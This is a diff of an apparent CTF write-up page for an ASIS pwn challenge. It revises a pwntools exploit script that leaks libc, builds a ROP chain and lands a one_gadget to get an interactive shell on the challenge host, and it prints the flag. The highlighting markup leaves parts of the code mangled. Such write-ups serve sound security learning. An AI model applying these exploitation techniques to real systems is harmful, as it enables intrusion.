@@ -923,52 +923,59 @@ In both main thread and child thread can overwrite return address. However in ch
 <p>Apparently we have to get shell in main thread, so I leak libc in child thread and write one_gadget to main thread&#39;s return address.
 Exploit script :</p>
 <pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
-from pwn import *
+from pwn <span class="hljs-built_in">import</span> *
+<span class="hljs-built_in">import</span> sys
 
-host = '37.139.17.37'
-port = 1338
+<span class="hljs-attr">host</span> = '<span class="hljs-number">37.139</span>.<span class="hljs-number">17.37</span>'
+<span class="hljs-attr">port</span> = <span class="hljs-number">1338</span>
 
-r = remote(host, port)
+<span class="hljs-attr">r</span> = remote(host, port)
 
-context.arch = 'amd64'
+context.<span class="hljs-attr">arch</span> = 'amd64'
 
-buf = 0x603000
+<span class="hljs-attr">buf</span> = <span class="hljs-number">0</span>x603000
 
-write_plt = 0x400890
-puts_plt = 0x0000000000400880
-read_plt = 0x4008e0
-puts_got = 0x0000000000602028
+<span class="hljs-attr">write_plt</span> = <span class="hljs-number">0</span>x400890
+<span class="hljs-attr">puts_plt</span> = <span class="hljs-number">0</span>x0000000000400880
+<span class="hljs-attr">read_plt</span> = <span class="hljs-number">0</span>x4008e0
+<span class="hljs-attr">puts_got</span> = <span class="hljs-number">0</span>x0000000000602028
 
-pop_rsi_r15 = 0x0000000000400cf1
-pop_rdi = 0x0000000000400cf3
+<span class="hljs-attr">pop_rsi_r15</span> = <span class="hljs-number">0</span>x0000000000400cf1
+<span class="hljs-attr">pop_rdi</span> = <span class="hljs-number">0</span>x0000000000400cf3
 
-main_read = 0x400bb7
-main_exit = 0x400c31
+<span class="hljs-attr">main_read</span> = <span class="hljs-number">0</span>x400bb7
+<span class="hljs-attr">main_exit</span> = <span class="hljs-number">0</span>x400c31
 
-puts_base = 0x00000000000809c0
-pop_rdx = 0x0000000000001b96
-one_gadget = 0x4f322
+<span class="hljs-attr">puts_base</span> = <span class="hljs-number">0</span>x00000000000809c0
+<span class="hljs-attr">pop_rdx</span> = <span class="hljs-number">0</span>x0000000000001b96
+<span class="hljs-attr">one_gadget</span> = <span class="hljs-number">0</span>x4f322
 
 r.recvuntil(':')
-payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
-payload += flat([buf-0x200, pop_rdi, puts_got, puts_plt, main_read])
+<span class="hljs-attr">payload</span> = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(<span class="hljs-number">0</span>x20, 'a')
+payload += flat([buf-<span class="hljs-number">0</span>x200, pop_rdi, puts_got, puts_plt, main_read])
 r.sendline(payload)
 r.recvuntil('Yeah tha')
-libc = u64(r.recvn(6).ljust(8, '\x00')) - puts_base
+<span class="hljs-attr">libc</span> = u64(r.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, '\x00')) - puts_base
 print ('libc : ', hex(libc))
 pop_rdx += libc
 print ('pop_rdx : ', hex(pop_rdx))
 one_gadget += libc
 print ('one_gadget : ', hex(one_gadget))
 
-
-time.sleep(1)
-payload = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(0x20, 'a')
-payload += flat([buf-0x400, pop_rdi, 0, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, read_plt, pop_rdi, 10, pop_rsi_r15, buf-0x400, 0, pop_rdx, 0x400, write_plt, main_exit])
+<span class="hljs-comment"># Since the PIPE fd number may vary due to some environment issue, you can specify your PIPE fd number here if 6 does not work for you.</span>
+<span class="hljs-keyword">if</span> len(sys.argv) &lt; <span class="hljs-number">2</span>:
+    <span class="hljs-comment"># this would work in the origin remote server</span>
+    <span class="hljs-attr">fd</span> = <span class="hljs-number">6</span>
+<span class="hljs-keyword">else</span>:
+    <span class="hljs-comment"># or enter a file descriptor, probably 6 to 10, here may require some brute force</span>
+    <span class="hljs-attr">fd</span> = int(sys.argv[<span class="hljs-number">1</span>])
+time.sleep(<span class="hljs-number">1</span>)
+<span class="hljs-attr">payload</span> = 'ASIS{N0T_R34LLY_4_FL4G}\x00'.ljust(<span class="hljs-number">0</span>x20, 'a')
+payload += flat([buf-<span class="hljs-number">0</span>x400, pop_rdi, <span class="hljs-number">0</span>, pop_rsi_r15, buf-<span class="hljs-number">0</span>x400, <span class="hljs-number">0</span>, pop_rdx, <span class="hljs-number">0</span>x400, read_plt, pop_rdi, fd, pop_rsi_r15, buf-<span class="hljs-number">0</span>x400, <span class="hljs-number">0</span>, pop_rdx, <span class="hljs-number">0</span>x400, write_plt, main_exit])
 r.sendline(payload)
 
-time.sleep(1)
-payload = 'TRANSMISSION_OVER\x00'.ljust(0x28, 'a')
+time.sleep(<span class="hljs-number">1</span>)
+<span class="hljs-attr">payload</span> = 'TRANSMISSION_OVER\x00'.ljust(<span class="hljs-number">0</span>x28, 'a')
 payload += flat([one_gadget])
 r.sendline(payload)
 r.interactive()</code></pre><p>flag : <code>ASIS{2655b2e6fa6861246c9423c75d76c0e3}</code></p>
@@ -1101,7 +1108,7 @@ port = <span class="hljs-number">60049</span>
 
 r = remote(host, port)
 
-<span class="hljs-comment"># this is too pass the PoW chal</span>
+<span class="hljs-comment"># this is to pass the PoW chal</span>
 start(r)
 
 cnt = <span class="hljs-number">0</span>
